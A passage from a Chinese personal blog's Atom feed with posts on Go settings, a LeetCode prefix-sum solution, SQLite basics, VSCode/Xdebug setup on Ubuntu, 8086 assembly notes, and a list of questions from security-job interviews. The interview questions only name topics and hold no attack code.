    <content type="html"><![CDATA[<h2 id="go相关命令"><a href="#go相关命令" class="headerlink" title="go相关命令"></a>go相关命令</h2><h3 id="go-env"><a href="#go-env" class="headerlink" title="go env"></a>go env</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">go env -w GOPROXY&#x3D;https:&#x2F;&#x2F;goproxy.io,direct</span><br><span class="line"># Set environment variable allow bypassing the proxy for selected modules</span><br><span class="line">go env -w GOPRIVATE&#x3D;*.corp.example.com</span><br><span class="line">go env -w GO111MODULE&#x3D;on</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;go相关命令&quot;&gt;&lt;a href=&quot;#go相关命令&quot; class=&quot;headerlink&quot; title=&quot;go相关命令&quot;&gt;&lt;/a&gt;go相关命令&lt;/h2&gt;&lt;h3 id=&quot;go-env&quot;&gt;&lt;a href=&quot;#go-env&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://prontosil.me/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="go" scheme="https://prontosil.me/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>每天一道leetcode-560和为k的子数组</title>
    <link href="https://prontosil.me/posts/eb2e19c0/"/>
    <id>https://prontosil.me/posts/eb2e19c0/</id>
    <published>2020-04-21T01:33:53.000Z</published>
    <updated>2020-04-21T04:23:37.322Z</updated>
    
    <content type="html"><![CDATA[<p>给定一个整数数组和一个整数 k，你需要找到该数组中和为 k 的连续的子数组的个数。</p><p>示例 1 :</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入:nums &#x3D; [1,1,1], k &#x3D; 2</span><br><span class="line">输出: 2 , [1,1] 与 [1,1] 为两种不同的情况。</span><br></pre></td></tr></table></figure><h2 id="法一——暴力"><a href="#法一——暴力" class="headerlink" title="法一——暴力"></a>法一——暴力</h2><p>两重循环，对每一个数字，从它开始往后，不断地累加，然后和k进行对比，这应该是最简单的想法了，但是我做这种题还是有点晕</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subarraySum</span><span class="params">(nums, k)</span>:</span></span><br><span class="line">    length = len(nums)</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(length):</span><br><span class="line">        sum = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(i, length):</span><br><span class="line">            sum += nums[j]</span><br><span class="line">            <span class="keyword">if</span> sum == k:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">return</span> count</span><br></pre></td></tr></table></figure><h2 id="法二——hashtables"><a href="#法二——hashtables" class="headerlink" title="法二——hashtables"></a>法二——hashtables</h2><p>思路就是不断地求和，然后判断 <code>cur_sum - k</code> 是否已经计算过了</p><blockquote><p>将前缀和放入哈希表，哈希表的设计为：key是前缀和，value是前缀和出现的次数。<br>如果当前要存入的前缀和sum，使得(sum - k)也在哈希表中时，则使用count累加哈希表中(sum - k)出现的次数，然后再将该sum放入哈希表中。这里的count与sum的添加次序不能调换，主要是为了处理k为0的情况。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">subarraySum</span><span class="params">(self, nums, k)</span>:</span></span><br><span class="line">    result, cur_sum = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    sum_dict = &#123;<span class="number">0</span>:<span class="number">1</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> nums:</span><br><span class="line">        cur_sum += num</span><br><span class="line">        <span class="keyword">if</span> cur_sum - k <span class="keyword">in</span> sum_dict:</span><br><span class="line">            result += sum_dict[cur_sum - k]</span><br><span class="line">        sum_dict[cur_sum] = sum_dict.get(cur_sum, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>go实现的代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">subarraySum</span><span class="params">(nums []<span class="keyword">int</span>, k <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    count := <span class="number">0</span></span><br><span class="line">    sumMap := <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">0</span>:<span class="number">1</span>,&#125;</span><br><span class="line">    sum := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _, num := <span class="keyword">range</span> nums &#123;</span><br><span class="line">        sum += num</span><br><span class="line">        <span class="keyword">if</span> sumMap[sum - k] &gt; <span class="number">0</span> &#123;</span><br><span class="line">            count += sumMap[sum - k]</span><br><span class="line">        &#125;</span><br><span class="line">        sumMap[sum]++</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> count</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;给定一个整数数组和一个整数 k，你需要找到该数组中和为 k 的连续的子数组的个数。&lt;/p&gt;
&lt;p&gt;示例 1 :&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span clas
      
    
    </summary>
    
    
      <category term="编程" scheme="https://prontosil.me/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="leetcode" scheme="https://prontosil.me/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>sqlite数据库笔记</title>
    <link href="https://prontosil.me/posts/532a05c/"/>
    <id>https://prontosil.me/posts/532a05c/</id>
    <published>2020-04-20T13:39:19.000Z</published>
    <updated>2020-04-24T14:18:21.870Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p><code>.quit</code> 退出</p><p><code>.tables</code> 列出所有的表</p><p><code>.schema</code> 查看构建表的sql语句</p><p><code>.database</code> 查看数据库</p><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><p>只需要 <code>sqlite</code> 加上数据库名即可</p><h2 id="创建表"><a href="#创建表" class="headerlink" title="创建表"></a>创建表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE user(</span><br><span class="line">ID INT NOT NULL PRIMARY KEY,</span><br><span class="line">name TEXT ,</span><br><span class="line">age TEXT,</span><br><span class="line">password TEXT);</span><br></pre></td></tr></table></figure><p><strong>sqlite不支持修改表已经存在的字段</strong>，只能把原有的表重命名一下再创建一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table user rename to &#96;user_123&#96;;</span><br></pre></td></tr></table></figure><p>如果主键要求自动递增</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">user</span>(</span><br><span class="line"><span class="keyword">ID</span> <span class="built_in">INTEGER</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> PRIMARY <span class="keyword">KEY</span> AUTOINCREMENT,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">TEXT</span>,</span><br><span class="line"><span class="keyword">password</span> <span class="built_in">TEXT</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="插入数据"><a href="#插入数据" class="headerlink" title="插入数据"></a>插入数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into user(name,password) values(&quot;pxy&quot;, &#39;123456&#39;);</span><br></pre></td></tr></table></figure><h2 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; select * from user;</span><br><span class="line">1|pxy|123456</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基本操作&quot;&gt;&lt;a href=&quot;#基本操作&quot; class=&quot;headerlink&quot; title=&quot;基本操作&quot;&gt;&lt;/a&gt;基本操作&lt;/h2&gt;&lt;p&gt;&lt;code&gt;.quit&lt;/code&gt; 退出&lt;/p&gt;
&lt;p&gt;&lt;code&gt;.tables&lt;/code&gt; 列出所有的表&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="编程" scheme="https://prontosil.me/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="sqlit" scheme="https://prontosil.me/tags/sqlit/"/>
    
      <category term="数据库" scheme="https://prontosil.me/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu配置vscode+xdebug</title>
    <link href="https://prontosil.me/posts/38fc34e6/"/>
    <id>https://prontosil.me/posts/38fc34e6/</id>
    <published>2020-04-20T10:14:29.000Z</published>
    <updated>2020-04-21T04:23:37.234Z</updated>
    
    <content type="html"><![CDATA[<h2 id="vscode安装"><a href="#vscode安装" class="headerlink" title="vscode安装"></a>vscode安装</h2><p>直接去官网下载deb包，然后双击即可完成安装</p><p>加两个配置选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;editor.mouseWheelZoom&quot;: true,</span><br><span class="line">&quot;php.validate.executablePath&quot;: &quot;&#x2F;usr&#x2F;bin&#x2F;php&quot;</span><br></pre></td></tr></table></figure><p>第一个是直接用滚轮缩放大小，并且图标的大小不变，第二个是配置php的路径</p><p>之后安装一些插件就不说了</p><h2 id="apache环境"><a href="#apache环境" class="headerlink" title="apache环境"></a>apache环境</h2><p>直接安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install apache2</span><br></pre></td></tr></table></figure><p>然后安装php模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libapache2-mod-php</span><br></pre></td></tr></table></figure><p>之后，修改一下html目录的用户和组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown pxy html&#x2F; -R</span><br><span class="line">chgrp pxy html&#x2F; -R</span><br></pre></td></tr></table></figure><h2 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -i &gt; a.txt</span><br></pre></td></tr></table></figure><p>然后将 a.txt 的内容拷贝到</p><p><a href="https://xdebug.org/wizard" target="_blank" rel="noopener">https://xdebug.org/wizard</a></p><p>自动帮你分析phpinfo的内容(不过现在只支持php7了)</p><ol><li><p>Download <a href="http://xdebug.org/files/xdebug-2.9.4.tgz" target="_blank" rel="noopener">xdebug-2.9.4.tgz</a></p></li><li><p>Install the pre-requisites for compiling PHP extensions.<br>On your Ubuntu system, install them with: <code>apt-get install php-dev autoconf automake</code></p></li><li><p>Unpack the downloaded file with <code>tar -xvzf xdebug-2.9.4.tgz</code></p></li><li><p>Run: <code>cd xdebug-2.9.4</code></p></li><li><p>Run: <code>phpize</code> (See the <a href="https://xdebug.org/docs/faq#phpize" target="_blank" rel="noopener">FAQ</a> if you don’t have <code>phpize</code>).</p><p>As part of its output it should show:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Configuring for:</span><br><span class="line">...</span><br><span class="line">Zend Module Api No:      20170718</span><br><span class="line">Zend Extension Api No:   320170718</span><br></pre></td></tr></table></figure></li></ol><p>   If it does not, you are using the wrong <code>phpize</code>. Please follow <a href="https://xdebug.org/docs/faq#custom-phpize" target="_blank" rel="noopener">this FAQ entry</a> and skip the next step.</p><ol start="6"><li><p>Run: <code>./configure</code></p></li><li><p>Run: <code>make</code></p></li><li><p>Run: <code>cp modules/xdebug.so /usr/lib/php/20170718</code></p></li><li><p>Update <code>/etc/php/7.2/cli/php.ini</code> and change the line<br><code>zend_extension = /usr/lib/php/20170718/xdebug.so</code></p></li><li><p>Please also update <code>php.ini</code> files in adjacent directories, as your system seems to be configured with a separate <code>php.ini</code> file for the web server and command line.</p></li></ol><p>重点是后面几个步骤：</p><ol><li><p><code>cp modules/xdebug.so /usr/lib/php/20170718</code></p></li><li><p>修改 <code>/etc/php/7.2/cli/php.ini</code> 文件内容，加上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_extension &#x3D; &#x2F;usr&#x2F;lib&#x2F;php&#x2F;20170718&#x2F;xdebug.so</span><br></pre></td></tr></table></figure></li><li><p>然后还需要修改  <code>/etc/php/7.2/apache2</code> 目录下的 php.ini 这个才是web的</p></li></ol><p>如图， <code>cli</code> 目录是命令行， <code>apache2</code> 才是web的</p><p><img src= "/img/loading.gif" data-src="/posts/38fc34e6/1587378336782.png" alt></p><ol start="4"><li>之后还需要修改 <code>mods-available</code> 目录下的文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pxy@pxy-VirtualBox:&#x2F;etc&#x2F;php&#x2F;7.2&#x2F;mods-available$ cat xdebug.ini </span><br><span class="line">;zend_extension&#x3D;xdebug.so</span><br><span class="line">xdebug.remote_enable &#x3D; 1</span><br><span class="line">xdebug.remote_port &#x3D; 9000</span><br><span class="line">;xdebug.idekey &#x3D; PHPSTORM</span><br><span class="line">xdebug.remote_host&#x3D;localhost</span><br><span class="line">xdebug.remote_autostart &#x3D; 1</span><br><span class="line">xdebug.show_error_trace &#x3D; 1</span><br></pre></td></tr></table></figure><ol start="5"><li>最后需要在web和cli下的 <code>conf.d</code> 中做一次软链接</li></ol><p><img src= "/img/loading.gif" data-src="/posts/38fc34e6/1587378447111.png" alt></p><p>至此xdebug+vscode就配置好了</p><p><img src= "/img/loading.gif" data-src="/posts/38fc34e6/1587378474835.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;vscode安装&quot;&gt;&lt;a href=&quot;#vscode安装&quot; class=&quot;headerlink&quot; title=&quot;vscode安装&quot;&gt;&lt;/a&gt;vscode安装&lt;/h2&gt;&lt;p&gt;直接去官网下载deb包，然后双击即可完成安装&lt;/p&gt;
&lt;p&gt;加两个配置选项&lt;/p&gt;
&lt;fig
      
    
    </summary>
    
    
      <category term="编程" scheme="https://prontosil.me/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="Linux" scheme="https://prontosil.me/tags/Linux/"/>
    
      <category term="vscode" scheme="https://prontosil.me/tags/vscode/"/>
    
      <category term="xdebug" scheme="https://prontosil.me/tags/xdebug/"/>
    
  </entry>
  
  <entry>
    <title>汇编从入门到入土六</title>
    <link href="https://prontosil.me/posts/79b4f583/"/>
    <id>https://prontosil.me/posts/79b4f583/</id>
    <published>2020-04-20T01:23:24.000Z</published>
    <updated>2020-04-22T02:59:53.415Z</updated>
    
    <content type="html"><![CDATA[<h2 id="mul和div"><a href="#mul和div" class="headerlink" title="mul和div"></a>mul和div</h2><p><strong>mul指令</strong></p><ol><li>两个相乘的数，如果都为8位，其中一个默认存放在AL，另一个放在8位寄存器或者内存字节单元中，结果是16位的，默认存放在AX中</li><li>两个相乘的数，如果都为16位，其中一个默认存放在AX，另一个放在16位寄存器或者内存字单元中，结果是32位的，高位默认存放在DX中，低位存放在AX中</li></ol><p><strong>div指令</strong></p><ol><li>除数有8位和16位，存放在reg或者内存单元</li><li>除数为8位，被除数为16位，被除数默认存放在AX中。除数为16位，被除数为32位，被除数高位存放在DX中，低位存放在AX中</li><li>结果，除数为8位，商存储在AL，余数存储在AH。除数为16位，商存储在AX，余数存储在DX</li></ol><h2 id="实验九-打印"><a href="#实验九-打印" class="headerlink" title="实验九 打印"></a>实验九 打印</h2><p>打印helloworld</p><p>尤其要注意 <code>mov al, [bp]</code>，这里是取出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">    db &#39;Hello World&#39;</span><br><span class="line">    db 24h</span><br><span class="line">    dw 1824 </span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">    mov ax,data</span><br><span class="line">    mov ds,ax</span><br><span class="line"></span><br><span class="line">    mov ax, 0b800h</span><br><span class="line">    mov es, ax</span><br><span class="line"></span><br><span class="line">    mov si,0</span><br><span class="line">    mov di,0</span><br><span class="line"></span><br><span class="line">    mov bx, ds:[12]</span><br><span class="line">    mov bp, ds:[11]</span><br><span class="line"></span><br><span class="line">    mov cx, 11</span><br><span class="line">s:</span><br><span class="line">    mov al, ds:[si]</span><br><span class="line">    mov es:[bx+di], al</span><br><span class="line">    mov al, [bp]</span><br><span class="line">    mov es:[bx+di+1], al</span><br><span class="line"></span><br><span class="line">    inc si</span><br><span class="line">    add di,2</span><br><span class="line">    loop s</span><br><span class="line"></span><br><span class="line">    mov ax,4c00h</span><br><span class="line">    int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;mul和div&quot;&gt;&lt;a href=&quot;#mul和div&quot; class=&quot;headerlink&quot; title=&quot;mul和div&quot;&gt;&lt;/a&gt;mul和div&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;mul指令&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;两个相乘的数，如果都为8位，
      
    
    </summary>
    
    
      <category term="编程" scheme="https://prontosil.me/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="汇编" scheme="https://prontosil.me/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>春招面经汇总</title>
    <link href="https://prontosil.me/posts/ddd168ac/"/>
    <id>https://prontosil.me/posts/ddd168ac/</id>
    <published>2020-04-19T23:44:35.000Z</published>
    <updated>2020-07-01T04:37:21.810Z</updated>
    
    <content type="html"><![CDATA[<p>从2月到4月，中间大大小小经历了20次左右的面试，最后选择去腾讯WXG的后台策略安全岗</p><h2 id="长亭"><a href="#长亭" class="headerlink" title="长亭"></a>长亭</h2><ol><li>自我介绍</li><li>tomcat AJP漏洞了解过吗</li><li>Java反序列化漏洞</li><li>JNDI注入，Java7和Java8的区别(这里确实是自己挖坑了，简历上写了自己会Java审计，JNDI注入等，但是并没有仔细准备，结果面试官抓着Java不放)</li><li>XXE如果无法联网怎么利用(三层嵌套报错XXE或者利用系统自带的DTD文件)</li><li>你比较擅长的方面</li></ol><p>不知道为啥和长亭面试官聊起来挺尬的。最后也只面试了20分钟就结束了，当然结果是凉凉了</p><h2 id="字节跳动-企业应用安全"><a href="#字节跳动-企业应用安全" class="headerlink" title="字节跳动-企业应用安全"></a>字节跳动-企业应用安全</h2><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><ol><li>具体的一个代码审计案例</li><li>说一下你知道的四种漏洞的原理，利用，危害和防御</li><li>XSS知道吗</li><li>说一下前端漏洞中你比较熟悉的</li><li>python沙盒逃逸</li><li>你觉得自己的优势是什么</li><li>对未来的规划</li></ol><p>字节跳动一面官感觉挺棒的，全程在引导你，而且特别尊重你说出自己的看法</p><h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><ol><li>简单问了几个小问题，python沙盒逃逸，JavaScript原型链污染</li><li>有没有了解过electron框架（就是开发vscode的，我说没有，但是我知道vue</li><li>vue怎么防御csrf(我不太了解vue怎么防范，先说一些怎么防CSRF balabal)</li><li>提示vue是通过ajax和后端连接，我：哦想起来了，那就用CORS来防御，然后说了CORS的防御</li><li>继续问。CORS分为简单请求和非简单请求，一个POST请求怎么区分</li><li>java做过哪些</li><li>mXSS了解吗</li><li>参数压栈入栈简单说下</li><li>你怎么将CTF学到的用到实战</li><li>go有没有了解</li></ol><p>二面面试官也挺棒的，唯一的问题就是。。。他家的小孩子太吵了。。几次打断我的思路</p><h3 id="三面"><a href="#三面" class="headerlink" title="三面"></a>三面</h3><p>三面是部门leader面，本来以为会继续问技术的，结果。。问了一堆人生相关的问题，而且回答的不好，没有完全表现出自己的水平。。</p><ol><li>第一次打CTF的经历(就是由于一开始的这个问题导致我后面都在说CTF，可能leader觉得我的眼界太小了吧)</li><li>你对未来的规划(这种问题真心不好回答)</li><li>你是怎么选择上这个专业的</li><li>你认为你还有哪些技能需要完善</li><li>你觉得学习编程语言需要注意哪些</li><li>go的垃圾回收机制(这个真是自己多嘴了，不该说自己学了点go的，这个问题没答上来)</li><li>go的并发机制有哪些(我就知道channel。。)</li></ol><p>周五面试完，下周一结果出来后就凉凉了，之后转岗到安全与风控部门，结果这是个开发岗，问的问题都是和编程有关的</p><p>只记录了几个问题：</p><ol><li>http1.0和1.1的区别</li><li>hashtable的原理</li><li>进程和线程的区别</li><li>进程间通信的方式</li><li>hash冲突解决</li><li>tcp和udp协议</li><li>用c语言实现双链表的插入和删除</li></ol><p>面试了一个多小时。。最后面试官说看了我的博客觉得我在漏洞挖掘，渗透这块还行，建议我投其他的部门，我说我就是转岗过来的。。。</p><h2 id="知道创宇-404实验室"><a href="#知道创宇-404实验室" class="headerlink" title="知道创宇 - 404实验室"></a>知道创宇 - 404实验室</h2><p>知道创宇是3月5号投递的，结果3月底才安排面试，以至于我都忘记投递了。</p><ol><li>分享几个cms漏洞挖掘的案例</li><li>代码审计的思路</li><li>假设一个cms你找到了一个反序列化的入口，如何挖掘POP链</li><li>如果cms中找不到POP链怎么利用(不知道，面试官告诉我可以用内置的类进行反序列化)</li><li>印象最深的一道CTF题</li><li>解释一下js的原型链污染</li><li>说一下你对tomcat AJP漏洞的分析</li><li>除了CTF，代码审计你还从哪里学安全知识</li><li>储存型XSS但是httponly了怎么利用</li><li>说一下redis主从复制漏洞</li><li>解释一下python的全局变量锁</li><li>python什么时候会用到多线程，什么时候用到多进程</li><li>为什么python的多线程是伪多线程</li><li>开发一个cms自动化代码审计的工具你有哪些思路</li></ol><h2 id="腾讯-应用运维安全"><a href="#腾讯-应用运维安全" class="headerlink" title="腾讯-应用运维安全"></a>腾讯-应用运维安全</h2><p>我后来才知道腾讯面试的流程，首先有一个公共的简历池，之后每个部门在里面捞简历，一般看到一份还行的简历会打电环了解一下情况(所以我接了好几个了解情况的电话)，之后如果要面试的话需要锁定这一份简历，这样的话其他部门就无法面试你，只有锁定简历的部门才行。</p><p>两轮电话了解情况之后，我的简历投到了应用运维安全，具体哪个事业群不知道</p><h3 id="一面-1"><a href="#一面-1" class="headerlink" title="一面"></a>一面</h3><ol><li>入侵响应</li><li>重置密码逻辑漏洞</li><li>RMI 利用的一个流程</li><li>flask SSTI 漏洞</li><li>XSS怎么防护</li><li>CSP如何绕</li><li>安全开发流程</li><li>JavaScript 闭包</li><li>常用远程控制软件</li><li>SQL过滤了单引号怎么绕过</li><li>SQL注入如何防护</li><li>Linux查看进程和查看端口的命令</li></ol><p>之后网申的页面提示进入了复试阶段，但是一直没更新。直到变灰。</p><h2 id="腾讯-后台策略安全"><a href="#腾讯-后台策略安全" class="headerlink" title="腾讯-后台策略安全"></a>腾讯-后台策略安全</h2><p>本来以为腾讯没希望了，人都去新疆给做培训了，结果腾讯微信事业群联系我问有没有意向</p><h3 id="4-9-0面"><a href="#4-9-0面" class="headerlink" title="4.9 0面"></a>4.9 0面</h3><p>问了大概一个多小时，感觉就是提前了解情况，后来才知道也不是一面。姑且叫做0面好了，面完之后也没有做记录，只有靠回忆了</p><ol><li>说一下python沙盒逃逸</li><li>了解过nodejs的沙盒逃逸吗</li><li>说一下JavaScript原型链污染</li><li>dll注入了解过吗</li><li>二进制程序常见的壳，脱壳的方法</li><li>了解过大数据吗</li><li>编程题: 将一个数组的奇数移到前面，偶数移到后面</li></ol><h3 id="4-11-一面"><a href="#4-11-一面" class="headerlink" title="4.11 一面"></a>4.11 一面</h3><ol><li>https和http的区别</li><li>http怎么防止运营商篡改你的流量</li><li>操作系统进程通信方式</li><li>XSS和CSRF</li><li>二次注入</li><li>web安全有没有总结一些方法论什么的</li><li>操作系统的最小调度单位是什么，操作系统资源分配的最小单位是什么，如果一个进程crash了，它的线程会发生什么</li><li>tcp为啥要三次握手，两次和四次不行吗</li><li>脱壳的方式</li><li>编程题：二分查找</li></ol><h3 id="4-13-二面"><a href="#4-13-二面" class="headerlink" title="4.13 二面"></a>4.13 二面</h3><p>这一面感觉面的挺尬的，面完后还觉得自己凉了，面完之后每天都忍不住去看官网的状态</p><ol><li>有没有渗透攻防经历</li><li>逆向了解过哪些</li><li>小程序游戏，比如跳一跳，怎么防止查重</li><li>二进制安全学习过哪些.</li><li>java安全学习过哪些</li><li>apk逆向了解不</li><li>java的hashtable实现原理</li><li>hash泛洪攻击了解吗</li><li>tcp泛洪攻击</li><li>你认为你相比其他人的优势</li><li>你玩过哪些微信游戏</li><li>内容安全了解吗</li><li>编程题：数组去重</li></ol><h3 id="4-17-三面"><a href="#4-17-三面" class="headerlink" title="4.17 三面"></a>4.17 三面</h3><p>第一次在机场面试。。实在是没办法，这是腾讯校招的最后一天必须得面完</p><p>然而面试官问我的问题我都没听明白</p><ol><li>怎么检测开发者绕过我们设定的策略</li><li>如何检测内容安全</li><li>如何防止外挂</li><li>你还有什么补充的(然后我就开始跑火车了)</li></ol><p>由于在机场，面试也只持续了半个小时左右</p><h3 id="4-18-hr面"><a href="#4-18-hr面" class="headerlink" title="4.18 hr面"></a>4.18 hr面</h3><ol><li>你认为你相对别人的优势</li><li>之前没有实习经历</li><li>之前有投递过其他的安全公司吗</li><li>你觉得这个岗位和你相契合吗</li><li>你父母的工作，你父母对你的影响</li></ol><p>聊了大概大概十分钟，面试官声音很有特点。面试的邀请函都是4.18号凌晨发过来的，估计在加班hhhh</p><h2 id="阿里"><a href="#阿里" class="headerlink" title="阿里"></a>阿里</h2><p>2月底的时候看到博客园的一个师傅，首页上写着阿里云云安全团队长期招收实习生，于是联系了他，做了一次简单的非正式面试，校招开始的时候也是他帮我内推的</p><h3 id="一面-2"><a href="#一面-2" class="headerlink" title="一面"></a>一面</h3><p>一面很水，不到二十分钟，感觉就是简单了解了情况</p><h3 id="二面-1"><a href="#二面-1" class="headerlink" title="二面"></a>二面</h3><ol><li>渗透测试有没有做过</li><li>怎么检测反弹shell</li><li>怎么检测黑客入侵Linux服务器</li><li>structs2漏洞说一下 </li><li>cms审计说一说</li><li>系统提权说一说</li><li>有没有做过演讲</li><li>安全方面有哪些成就</li><li>IOT哪些产出</li></ol><p>答得不是很好，结果凉凉</p><h2 id="华为"><a href="#华为" class="headerlink" title="华为"></a>华为</h2><h3 id="笔试"><a href="#笔试" class="headerlink" 